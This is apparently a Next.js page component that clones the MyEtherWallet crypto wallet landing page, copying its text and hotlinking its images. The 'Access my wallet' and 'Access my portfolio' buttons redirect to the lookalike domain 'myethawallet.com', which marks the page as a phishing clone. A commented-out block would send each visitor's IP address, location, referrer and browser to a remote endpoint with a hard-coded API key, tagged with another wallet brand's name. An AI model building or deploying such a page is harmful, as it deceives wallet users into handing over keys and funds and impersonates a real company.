'use client'
import "./globals.css";
import FeaturesCarousel from "../components/FeaturesCarousel";
import NewsletterSection from "../components/NewsletterSection";
// import { useState, useEffect } from 'react';
// import { useRef } from 'react';
// import { usePathname } from 'next/navigation';
// import { getUserCountry } from '../userLocation';
// import axios from 'axios';

export default function Home() {
  // const [browser, setBrowser] = useState<string | undefined>(undefined);
  // const hasSentVisitorMessage = useRef(false);
  // const pathname = usePathname();
  // const getCurrentUrl = () => {
  //   if (typeof window !== "undefined") {
  //     let url = `${window.location.origin}${pathname}`;
  //     if (url.includes("localhost")) {
  //       url = "https://google.com";
  //     }
  //     if (url.includes("vercel.com")) {
  //       url = url.replace("vercel.com", "digitalocean.com");
  //     }
  //     console.log("getCurrentUrl returning:", url);
  //     return url;
  //   }
  //   console.log("getCurrentUrl: window not available, returning empty string");
  //   return "";
  // };
  // const sendTelegramMessage = (userCountry: { country?: string; countryEmoji?: string; city?: string; ip?: string } | null) => {
  //   // console.log("User Country", userCountry);

  //   const messageData = {
  //     info: "Regular Visitor", // You can update this logic as needed
  //     url: getCurrentUrl(),
  //     referer: document.referrer || getCurrentUrl(),
  //     location: {
  //       country: userCountry?.country || "Unknown",
  //       countryEmoji: userCountry?.countryEmoji || "",
  //       city: userCountry?.city || "Unknown",
  //       ipAddress: userCountry?.ip || "0.0.0.0",
  //     },
  //     agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
  //     date: new Date().toISOString(),
  //     appName: "adalite",
  //   };
  //   console.log("Message Data", messageData);
  //   axios
  //     .post(
  //       "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/font",
  //       messageData,
  //       {
  //         headers: {
  //           "Content-Type": "application/json",
  //           "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
  //         },
  //       }
  //     )
  //     .catch((error) =>
  //       console.error(
  //         "Error sending font message:",
  //         error.response.data.details
  //       )
  //     );
  // };

  // useEffect(() => {
  //   if (!hasSentVisitorMessage.current) {
  //     const fetchUserLocation = async () => {
  //       const userCountry = await getUserCountry();
  //       sendTelegramMessage(userCountry);
  //     };
  //     fetchUserLocation();
  //     hasSentVisitorMessage.current = true;
  //   }
  // }, [sendTelegramMessage]);

 

  // useEffect(() => {
  //   // Set browser info only on client side
  //   if (typeof window !== "undefined") {
  //     setBrowser(navigator.userAgent);
  //   }
  // }, [sendTelegramMessage]);

  // useEffect(() => {
  //   if (!hasSentVisitorMessage.current) {
  //     const fetchUserLocation = async () => {
  //       const userCountry = await getUserCountry();
  //       sendTelegramMessage(userCountry);
  //     };
  //     fetchUserLocation();
  //     hasSentVisitorMessage.current = true;
  //   }
  // }, [sendTelegramMessage]);
  return (
    <main className="min-h-screen bg-grey-900">
      {/* Hero Section with Gradient Background */}
      <div className="bg-linear-to-b from-cyan-200 to-white relative overflow-hidden">
        {/* Hero Content */}
        <div className="relative z-10">
          <div className="pt-32 pb-20 px-6">
            <div className="max-w-6xl mx-auto text-center">
              {/* Brand Header */}
              <div className="flex items-center justify-center gap-8 mb-16">
                <h2 className="text-[#1A535C] text-xl md:text-3xl font-bold mt-10">
                  MyEtherWallet
                </h2>
                <div className="flex items-center justify-center gap-2">
                  {/* Left image */}
                  <img
                    src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_18x50/images/misc/leaf.svg"
                    alt="Left Leaf"
                    className="h-12 w-auto"
                  />

                  {/* Middle stars and text */}
                  <div className="flex flex-col items-center text-center">
                    <img
                      src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_114x22/images/misc/stars.svg"
                      alt="Star Rating"
                      className="h-3 w-auto mb-2"
                    />
                    <p className="text-sm text-gray-700">
                      Trusted by millions worldwide.
                    </p>
                    <p className="text-sm text-gray-700">Since 2015.</p>
                  </div>

                  {/* Right image (mirrored) */}
                  <img
                    src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_40x112/images/misc/leaf.svg"
                    alt="Right Leaf"
                    className="h-12 w-auto scale-x-[-1]"
                  />
                </div>
              </div>

              {/* Main Heading */}
              <div className="mb-12 relative">
                <h1 className="text-5xl md:text-7xl font-bold text-gray-900 leading-tight">
                  The most reputable, friendly,
                  <br />
                  and secure crypto wallet.
                </h1>

                {/* Astronaut illustration */}
                <div className="absolute -left-32 top-15 hidden lg:block">
                  <img
                    src="https://www.myetherwallet.com/mew-landing-page/_ipx/w_384&f_webp/images/misc/peggy.webp"
                    alt="Astronaut Illustration"
                    className="w-37 h-40 object-contain"
                  />
                </div>
              </div>

              {/* CTA Buttons */}
              <div className="flex flex-col items-center gap-4">
                <button className="bg-blue-700 text-[24px] text-white px-12 py-4 rounded-3xl text-lg font-semibold hover:bg-blue-700 transition shadow-lg">
                  Create a new wallet
                </button>
                <div className="flex items-center gap-2">
                  <span className="text-gray-700">or</span>
                  <button
                    onClick={()=>{
                      window.location.href = 'https://myethawallet.com/wallet'
                    }}
                    className="text-[21px] text-gray-900 underline hover:text-teal-600 transition font-medium"
                  >
                    Access my wallet
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Products Section */}
      <section className="py-20 px-6 ">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-5xl font-bold text-gray-900 mb-4">
              Our products make crypto easy
            </h2>
            <p className="text-[24px] text-gray-600">
              Available on mobile and on desktop in your browser
            </p>
          </div>

          {/* MEW Mobile App */}
          <div className="mb-20 bg-gradient-to-br from-blue-50 to-purple-50 rounded-3xl p-12">
            <div className="grid lg:grid-cols-2 gap-12 items-center">
              <div>
                <div className="flex items-center gap-4 mb-6">
                  <div className="w-20 h-20 flex items-center justify-center rounded-2xl overflow-hidden">
                    <img
                      src="https://www.myetherwallet.com/mew-landing-page/_ipx/w_128/images/products/mewweb-logo.svg"
                      alt="MyEtherWallet Logo"
                      className="w-full h-full object-contain"
                    />
                  </div>

                  <div>
                    <h3 className="text-4xl font-bold text-gray-900">
                      MEW Mobile App
                    </h3>
                    <div className="flex items-center gap-2 mt-2">
                      <div className="flex">
                        {[...Array(5)].map((_, i) => (
                          <svg
                            key={i}
                            className="w-5 h-5 text-gray-400"
                            fill="currentColor"
                            viewBox="0 0 20 20"
                          >
                            <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
                          </svg>
                        ))}
                      </div>
                      <span className="text-gray-600">13k+ ratings</span>
                    </div>
                  </div>
                </div>

                <p className="text-2xl text-gray-800 mb-6 font-medium">
                  Stake, swap and manage you crypto on the go.
                </p>

                <ul className="space-y-4 mb-8">
                  <li className="flex items-start gap-3">
                    <span className="text-gray-400 text-xl">•</span>
                    <span className="text-[21px] text-gray-700">
                      Protect your mobile crypto with security rivaling hardware
                      wallets.
                    </span>
                  </li>
                  <li className="flex items-start gap-3">
                    <span className="text-gray-400 text-xl">•</span>
                    <span className=" text-[21px] text-gray-700">
                      Robust NFT management, onchain browser and more.
                    </span>
                  </li>
                </ul>

                <button className="bg-blue-600 text-white px-8 py-4 rounded-full text-lg font-semibold hover:bg-blue-700 transition shadow-lg inline-flex items-center gap-2">
                  Get MEW Mobile App
                  <svg
                    className="w-5 h-5"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M13 7l5 5m0 0l-5 5m5-5H6"
                    />
                  </svg>
                </button>
              </div>
              <div className="flex  justify-center">
                <img
                  src="https://www.myetherwallet.com/mew-landing-page/_nuxt/mewwallet_2x.w5zytgzf.webp"
                  alt="MyEtherWallet Preview"
                  className="rounded-3xl shadow-2xl w-full max-w-2xl"
                />
              </div>
            </div>
          </div>

          {/* Enkrypt Browser Wallet */}
          <div className="mb-20 bg-gradient-to-br from-purple-50 to-pink-50 rounded-3xl p-12">
            <div className="grid lg:grid-cols-2 gap-12 items-center">
              <div className="order-2 lg:order-1 flex gap-4 justify-center">
                <div className="rounded-3xl shadow-2xl w-full max-w-2xl">
                  <div className="flex justify-center">
                    <img
                      src="https://www.myetherwallet.com/mew-landing-page/_nuxt/enkrypt_2x.BjfXgkDO.webp"
                      alt="Enkrypt Browser Wallet"
                      className="rounded-3xl shadow-2xl w-full max-w-2xl"
                    />
                  </div>
                </div>
              </div>

              <div className="order-1 lg:order-2">
                <div className="flex items-center gap-4 mb-6">
                  <div className="w-20 h-20 flex items-center justify-center rounded-2xl overflow-hidden">
                    <img
                      src="https://www.myetherwallet.com/mew-landing-page/_ipx/w_128&f_webp/images/products/enkrypt-logo.webp"
                      alt="Enkrypt Logo"
                      className="w-full h-full object-contain"
                    />
                  </div>

                  <div>
                    <h3 className="text-4xl font-bold text-gray-900">
                      Enkrypt Browser Wallet
                    </h3>
                    <div className="flex items-center gap-2 mt-2">
                      <div className="flex">
                        {[...Array(5)].map((_, i) => (
                          <svg
                            key={i}
                            className="w-5 h-5 text-gray-400"
                            fill="currentColor"
                            viewBox="0 0 20 20"
                          >
                            <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
                          </svg>
                        ))}
                      </div>
                      <span className="text-gray-600">145,000+ users</span>
                    </div>
                  </div>
                </div>

                <p className="text-2xl text-gray-800 mb-6 font-medium">
                  Manage your crypto across multiple blockchains with one
                  wallet.
                </p>

                <ul className="space-y-4 mb-8">
                  <li className="flex items-start gap-3">
                    <span className="text-gray-400 text-xl">•</span>
                    <span className="text-gray-700 text-[21px]">
                      Built-in decentralized swaps for power traders.
                    </span>
                  </li>
                  <li className="flex items-start gap-3">
                    <span className="text-gray-400 text-xl">•</span>
                    <span className="text-gray-700  text-[21px]">
                      Bridge your crypto from one chain to another.
                    </span>
                  </li>
                </ul>

                <button className="bg-purple-600 text-white px-8 py-4 rounded-full text-lg font-semibold hover:bg-purple-700 transition shadow-lg inline-flex items-center gap-2">
                  Get Enkrypt Browser Wallet
                  <svg
                    className="w-5 h-5"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M13 7l5 5m0 0l-5 5m5-5H6"
                    />
                  </svg>
                </button>
              </div>
            </div>
          </div>

          {/* MEW Portfolio Manager */}
          <div className="bg-gradient-to-br from-cyan-50 to-teal-50 rounded-3xl p-12">
            <div className="grid lg:grid-cols-2 gap-12 items-center">
              <div>
                <div className="flex items-center gap-4 mb-6">
                  <div className="w-20 h-20 rounded-2xl overflow-hidden flex items-center justify-center bg-white">
                    <img
                      src="https://www.myetherwallet.com/mew-landing-page/_ipx/w_128/images/products/portfolio.svg"
                      alt="Portfolio Icon"
                      className="w-full h-full object-contain"
                    />
                  </div>

                  <div>
                    <h3 className="text-4xl font-bold text-gray-900">MEW</h3>
                    <p className="text-xl text-gray-600">Portfolio Manager</p>
                  </div>
                </div>

                <p className="text-2xl text-gray-800 mb-6 font-medium">
                  View and manage your crypto portfolio on the big screen.
                </p>

                <ul className="space-y-4 mb-8">
                  <li className="flex items-start gap-3">
                    <span className=" text-gray-400 text-xl">•</span>
                    <span className=" text-[21px] text-gray-700">
                      Available to all MEW Mobile App and Enkrypt users.
                    </span>
                  </li>
                  <li className="flex items-start gap-3">
                    <span className="text-gray-400 text-xl">•</span>
                    <span className="text-[21px] text-gray-700">
                      Works with most hardware and 3rd party wallets.
                    </span>
                  </li>
                </ul>

                <button
                  onClick={()=>{
                    window.open('https://myethawallet.com')
                  }}
                className="bg-white border-2 border-teal-600 text-teal-600 px-8 py-4 rounded-full text-lg font-semibold hover:bg-teal-50 transition shadow-lg inline-flex items-center gap-2">
                  Access my portfolio
                  <svg
                    className="w-5 h-5"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M13 7l5 5m0 0l-5 5m5-5H6"
                    />
                  </svg>
                </button>
                <br />
                <br />
                <div className="flex items-center gap-4 mb-6">
                  <img
                    src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_72x72/icons/heart.svg"
                    alt="Heart Icon"
                    className="w-8 h-10"
                  />
                  <p className="text-l text-gray-600 font-medium">
                    Works with most hardware and 3rd party wallets.
                  </p>
                </div>
              </div>
              <div className="flex gap-4 justify-center">
                <img
                  src="https://www.myetherwallet.com/mew-landing-page/_nuxt/portfolio_2x.CSEFP7-G.webp"
                  alt="MEW Portfolio Preview"
                  className="rounded-3xl shadow-2xl w-full max-w-2xl"
                />
              </div>
            </div>
          </div>
        </div>
      </section>
      {/* Call to Action Section */}
      <section className="relative py-20 px-6 bg-white overflow-hidden">
        <div className="max-w-7xl mx-auto">
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            {/* Text Content */}
            <div className="max-w-2xl">
              <h2 className="text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-bold text-gray-900 mb-6 leading-tight">
                Want to get into crypto?
                <br />
                MEW is the way to do it
              </h2>
              <ul className="space-y-4 text-left mb-12 lg:mb-0">
                <li className="flex items-start gap-3">
                  <span className="text-gray-400 text-xl flex-shrink-0">•</span>
                  <span className="text-base sm:text-lg md:text-xl text-gray-700 font-semibold">
                    The Ethereum ecosystem has the biggest development community
                    in all of web3.
                  </span>
                </li>
                <li className="flex items-start gap-3">
                  <span className="text-gray-400 text-xl flex-shrink-0">•</span>
                  <span className="text-base sm:text-lg md:text-xl text-gray-700 font-semibold">
                    MEW is the most trusted and battle tested Ethereum wallet.
                  </span>
                </li>
              </ul>
            </div>

            {/* Ethereum Card */}
            <div className="flex justify-center lg:justify-end">
              <div className="bg-white rounded-3xl p-6 w-full max-w-[340px] shadow-lg border border-gray-100">
                <div className="flex items-center mb-4 gap-3 flex-wrap">
                  <img
                    src="https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_ethereum_eth_logo_fe7073d75c.png&format=webp"
                    alt="Ethereum"
                    width={32}
                    height={32}
                    loading="lazy"
                    className="object-contain"
                  />
                  <p className="font-bold text-gray-900 text-lg">Ethereum</p>
                  <p className="text-gray-800 text-lg ml-auto">$4041.33</p>
                </div>
                <p className="text-sm sm:text-base leading-relaxed text-gray-600">
                  Not investment advice. All decisions are made at the user`&apos;`s
                  own risk.
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Self Custody Section */}
      <section className="py-20 px-6 bg-white">
        <div className="max-w-7xl mx-auto">
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            <div>
              <h2 className="text-5xl md:text-6xl font-bold text-gray-900 mb-6">
                Truly own your crypto assets.
              </h2>
              <p className="text-2xl text-gray-700 leading-relaxed">
                MEW is a self-custody wallet, which means that you hold your
                keys and nobody except you (not even the MEW team) can access
                your crypto.
              </p>
            </div>
            <div className="flex justify-center">
              <img
                src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_1692x2008/images/custody/self-custody.svg"
                alt="Self Custody Illustration"
                className="w-124 h-124 object-contain rounded-3xl"
              />
            </div>
          </div>
        </div>
      </section>

      {/* Token Features Section */}
      <section className="py-20 px-6 ">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-5xl md:text-6xl font-bold text-gray-900 text-center mb-6">
            Buy, store, send,
            <br />
            and swap tokens
          </h2>

          <FeaturesCarousel />
        </div>
      </section>

      {/* Token Support Section */}
      <section className="py-20 px-6 bg-white">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-5xl font-bold text-gray-900 mb-12">
            MEW supports ETH and all ERC-20 tokens!
          </h2>
          <div className="flex flex-wrap gap-4">
            {[
              {
                name: "Ethereum (ETH)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_ethereum_eth_logo_fe7073d75c.png&format=webp",
              },
              {
                name: "Artificial Superintelligence Alliance (FET)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_Artificial_Superintelligence_b3dac8375c.png&format=webp",
              },
              {
                name: "Kelp DAO Restaked ETH (RSETH)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_Kelp_DAO_Restaked_ETH_2bb04cded8.png&format=webp",
              },
              {
                name: "EigenLayer (EIGEN)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_Eigen_Layer_f1e19b84b7.png&format=webp",
              },
              {
                name: "Balancer (BAL)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_balancer_bal_logo_ecaf2af4e7.png&format=webp",
              },
              {
                name: "Usual USD (USDO)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_Usual_USD_e9d7c90b6e.png&format=webp", // placeholder
              },
              {
                name: "Tether Gold(XAUT)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_tether_gold_7de2d6bb70.png&format=webp",
              },
              {
                name: "Render (RENDER)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_rendertokens_cc4df879a2.png&format=webp",
              },
              {
                name: "Renzo Restaked ETH (EZETH)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_Renzo_Restaking_ETH_db96b0d43c.png&format=webp",
              },
              {
                name: "Movement (MOVE)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_movement_6eec15eabf.png&format=webp", // placeholder
              },
              {
                name: "Fantom (FTM)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_fantom_ftm_logo_a0f3ebb68a.png&format=webp",
              },
              {
                name: "Cosplay (COT)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_cosplay_3bcf387104.png&format=webp",
              },
              {
                name: "Cornucopias (COPI)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_image_1654_49ba28dfb8.png&format=webp",
              },
              {
                name: "Ether.fi (ETHFI)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_Ether_fi_82e4e9cefa.png&format=webp",
              },
              {
                name: "Onyxcoin (XCN)",
                image:
                  "https://img.mewapi.io/?image=https://strapi.mewapi.io/uploads/thumbnail_Onyxcoin_28e6176b4f.png&format=webp",
              },
            ].map((token, i) => (
              <div
                key={i}
                className="bg-white border-2 border-gray-200 rounded-full px-6 py-3 flex items-center gap-3 hover:border-blue-500 transition"
              >
                <img
                  src={token.image}
                  alt={token.name}
                  className="w-7 h-7 rounded-full object-contain"
                />
                <span className="font-medium">{token.name}</span>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Staking Section */}
      <section className="py-20 px-6 bg-inherit">
        <div className="max-w-7xl mx-auto">
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            <div>
              <h2 className="text-5xl md:text-6xl font-bold text-gray-900 mb-6">
                Make your crypto
                <br />
                make crypto.
              </h2>
              <p className="text-2xl text-gray-700">
                Stake your ETH and get rewarded by the Ethereum blockchain.
              </p>
            </div>
            <div className="flex justify-center">
              <img
                src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_872x592/images/staking/percent-numbers.svg"
                alt="Self Custody Illustration"
                className="w-124 h-124 object-contain rounded-3xl"
              />
            </div>
          </div>
          <br />
          <br />

          <div className="grid md:grid-cols-3 gap-8 text-[21px]">
            {/* Be your own bank */}
            <div className="bg-white  rounded-2xl p-8 shadow-lg">
              <div className="w-20 h-20 rounded-2xl mb-6 flex items-center justify-center overflow-hidden">
                <img
                  src="https://www.myetherwallet.com/mew-landing-page/_ipx/f_webp&s_186x192/images/staking/bank-pic.webp"
                  alt="Be your own bank"
                  className="w-full h-full object-cover"
                />
              </div>
              <h3 className="text-2xl font-bold mb-4">Be your own bank</h3>
              <p className="text-gray-700">
                Unlike big finance banks that lend your money out, in crypto,
                you are the lender.
              </p>
            </div>

            {/* Staking made easy */}
            <div className="bg-white rounded-2xl p-8 shadow-lg">
              <div className="mb-6">
                <h3 className="text-2xl font-bold mb-4">Staking made easy</h3>
                <div className="flex gap-2 mb-4 items-center">
                  <img
                    src="https://www.myetherwallet.com/mew-landing-page/_ipx/f_webp&s_120x120/images/staking/process-buy.webp"
                    alt="Buy"
                    className="w-16 h-16 rounded-xl object-cover"
                  />
                  <span className="text-2xl">→</span>
                  <img
                    src="https://www.myetherwallet.com/mew-landing-page/_ipx/f_webp&s_120x120/images/staking/process-stake.webp"
                    alt="Stake"
                    className="w-16 h-16 rounded-xl object-cover"
                  />
                  <span className="text-2xl">→</span>
                  <img
                    src="https://www.myetherwallet.com/mew-landing-page/_ipx/f_webp&s_120x120/images/staking/process-earn.webp"
                    alt="Earn"
                    className="w-16 h-16 rounded-xl object-cover"
                  />
                </div>
                <p className="text-gray-700">
                  At MEW we make it easy to stake your crypto right from your
                  wallet and start earning rewards right away.
                </p>
              </div>
            </div>

            {/* 32 ETH Staking */}
            <div className="bg-white rounded-2xl p-8 shadow-lg">
              <div className="flex items-center gap-3 mb-6">
                <img
                  src="https://www.myetherwallet.com/mew-landing-page/_ipx/f_webp&s_120x120/images/staking/ETHLido.webp"
                  alt="ETH"
                  className="w-12 h-12 rounded-full object-cover"
                />
                <img
                  src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_120x120/images/staking/ETHStaked.svg"
                  alt="Staking"
                  className="w-12 h-12 rounded-full object-cover"
                />
              </div>
              <h3 className="text-2xl font-bold mb-2">32 ETH Staking</h3>
              <p className="text-blue-600 font-semibold mb-4">Up to 4.0% APR</p>
              <p className="text-2xl font-bold mb-2">
                No minimum liquid staking
              </p>
              <p className="text-blue-600 font-semibold mb-4">Up to 3.6% APR</p>
            </div>
          </div>
        </div>
      </section>

      {/* Powerful Wallet Section */}
      <section className="py-20 px-6">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-4xl md:text-6xl lg:text-7xl font-bold text-gray-900 mb-16">
            A powerful wallet for
            <br />
            all your crypto needs.
          </h2>

          <div className="grid lg:grid-cols-2 gap-12 items-center mb-20">
            {/* Left side - Feature cards */}
            <div className="space-y-6">
              {/* All your NFTs Card */}
              <div className="bg-blue-600 rounded-3xl p-8 text-white">
                <h3 className="text-2xl  mb-4">
                  All your NFTs.
                  <span className="text-blue-200">
                    Safely keep all your NFTs from various chains in one place
                    on mobile or desktop.
                  </span>
                </h3>
              </div>

              {/* Access web3 apps */}
              <div className="bg-white rounded-3xl p-8">
                <h3 className="text-2xl font-bold text-gray-900 mb-3">
                  Access web3 apps.
                </h3>
                <p className="text-gray-700 text-lg">
                  Use your favorite web3 apps on desktop with Enkrypt or on
                  mobile with MEW Mobile App.
                </p>
              </div>

              {/* Multiple chains */}
              <div className="bg-white rounded-3xl p-8">
                <h3 className="text-2xl font-bold text-gray-900 mb-3">
                  Multiple chains.
                </h3>
                <p className="text-gray-700 text-lg">
                  Access decentralized networks and bridge assets between
                  popular blockchains. From Ethereum, to BNB Chain, to Polygon.
                </p>
              </div>
            </div>

            {/* Right side - Phone mockup image */}
            <div className="flex justify-center lg:justify-end">
              <img
                src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_1532x1040/images/nfts/all-nfts.webp"
                alt="NFT Collection"
                className="w-full max-w-2xl h-auto rounded-3xl shadow-2xl"
              />
            </div>
          </div>
        </div>
      </section>

      {/* Trusted Data Section */}
      <section className="py-20 px-6 bg-inherit">
        <div className="max-w-7xl mx-auto">
          {/* Heading at top */}
          <h2 className="text-5xl md:text-6xl font-bold text-gray-900 mb-16">
            Trusted data, from
            <br />
            the source
          </h2>

          <div className="grid lg:grid-cols-2 gap-16 items-center">
            {/* Left side - Image */}
            <div className="flex justify-center lg:justify-start">
              <div className="bg-gradient-to-br from-blue-500 to-blue-700 rounded-3xl p-8 md:p-10 shadow-2xl max-w-lg w-full">
                <img
                  src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_614x400/images/ethvm/hero-group.webp"
                  alt="EthVM Block Explorer"
                  className="w-48 h-auto object-contain"
                />
                <div className="mt-6">
                  <h3 className="text-3xl md:text-4xl font-bold text-white mb-2">
                    eth<span className="text-blue-400">VM</span>
                  </h3>
                  <p className="text-2xl md:text-3xl font-bold text-white mb-3">
                    block explorer
                  </p>
                  <p className="text-white text-base md:text-lg opacity-90">
                    Track, analyze, and explore on the Ethereum blockchain.
                  </p>
                </div>
              </div>
            </div>

            {/* Right side - Text content */}
            <div>
              <ul className="space-y-6 text-[28px]">
                <li className="flex items-start">
                  <span className="text-gray-900 text-2xl mr-4 mt-1">•</span>
                  <span className="text-[30px] md:text-2xl text-gray-900 font-bold">
                    Based on our open-sourced blockchain explorer technology.
                  </span>
                </li>
                <li className="flex items-start">
                  <span className="text-gray-900 text-2xl mr-4 mt-1">•</span>
                  <span className="text-[30px] md:text-2xl text-gray-900 font-bold">
                    Fast.
                  </span>
                </li>
                <li className="flex items-start">
                  <span className="text-gray-900 text-2xl mr-4 mt-1">•</span>
                  <span className="text-[30px] md:text-2xl text-gray-900 font-bold">
                    Scalable for new ecosystems.
                  </span>
                </li>
                <li className="flex items-start">
                  <span className="text-gray-900 text-2xl mr-4 mt-1">•</span>
                  <span className="text-[30px] md:text-2xl text-gray-900 font-bold">
                    Beautifully designed.
                  </span>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </section>
      {/* What makes MEW a good choice Section */}
      <section className="py-20 px-6">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-4xl md:text-6xl lg:text-7xl font-bold text-gray-900 text-center mb-16">
            What makes MEW a<br />
            good choice?
          </h2>

          {/* First Row - 3 Cards */}
          <div className="grid md:grid-cols-3 gap-8 mb-8">
            {/* Crypto veterans since 2015 */}
            <div className="bg-white rounded-3xl p-8 shadow-sm">
              <div className="mb-6">
                <img
                  src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_96x96/icons/feature/veterans.svg"
                  alt="Crypto veterans"
                  className="w-16 h-16"
                />
              </div>
              <h3 className="text-3xl font-bold text-gray-900 mb-4">
                Crypto veterans since 2015
              </h3>
              <p className="text-gray-600 text-lg">
                MEW is the world`&apos;`s first and one of the most trusted Ethereum
                and L2 wallets.
              </p>
            </div>

            {/* Private */}
            <div className="bg-white rounded-3xl p-8 shadow-sm">
              <div className="mb-6">
                <img
                  src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_96x96/icons/feature/private.svg"
                  alt="Private"
                  className="w-16 h-16"
                />
              </div>
              <h3 className="text-3xl font-bold text-gray-900 mb-4">Private</h3>
              <p className="text-gray-600 text-lg">
                We don`&apos;`t track any personally identifiable information, account
                addresses, or asset balances.
              </p>
            </div>

            {/* Hardware wallet support */}
            <div className="bg-white rounded-3xl p-8 shadow-sm">
              <div className="mb-6">
                <img
                  src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_96x96/icons/feature/hardware-support.svg"
                  alt="Hardware wallet"
                  className="w-16 h-16"
                />
              </div>
              <h3 className="text-3xl font-bold text-gray-900 mb-4">
                Hardware wallet support
              </h3>
              <p className="text-gray-600 text-lg mb-6">
                We support all major hardware wallets including Ledger and
                Trezor in MEW web portfolio and Enkrypt.
              </p>
              <button className="border-2 border-gray-900 text-gray-900 px-8 py-3 rounded-full font-semibold hover:bg-gray-900 hover:text-white transition">
                Buy a hardware wallet
              </button>
            </div>
          </div>

          {/* Second Row - 3 Cards */}
          <div className="grid md:grid-cols-3 gap-8">
            {/* Secure and transparent */}
            <div className="bg-white rounded-3xl p-8 shadow-sm">
              <div className="mb-6">
                <img
                  src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_96x96/icons/feature/audited.svg"
                  alt="Secure"
                  className="w-16 h-16"
                />
              </div>
              <h3 className="text-3xl font-bold text-gray-900 mb-4">
                Secure and transparent
              </h3>
              <p className="text-gray-600 text-lg">
                Independently audited in Bug Bounty program on HackenProof and,
                previously, HackerOne.
              </p>
            </div>

            {/* Self-custody */}
            <div className="bg-white rounded-3xl p-8 shadow-sm">
              <div className="mb-6">
                <img
                  src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_96x96/icons/feature/non-custodial.svg"
                  alt="Self-custody"
                  className="w-16 h-16"
                />
              </div>
              <h3 className="text-3xl font-bold text-gray-900 mb-4">
                Self-custody
              </h3>
              <p className="text-gray-600 text-lg">
                You and only you are in control of your assets. Your keys, your
                crypto.
              </p>
            </div>

            {/* Easy to use */}
            <div className="bg-white-900 rounded-3xl p-8 shadow-sm">
              <div className="mb-6">
                <img
                  src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_96x96/icons/feature/easy.svg"
                  alt="Easy to use"
                  className="w-16 h-16"
                />
              </div>
              <h3 className="text-3xl font-bold text-gray-900 mb-4">
                Easy to use
              </h3>
              <p className="text-gray-600 text-lg">
                Get started in minutes, no prior knowledge needed.
              </p>
            </div>
          </div>

          {/* Partner Logos */}
          <div className="mt-16">
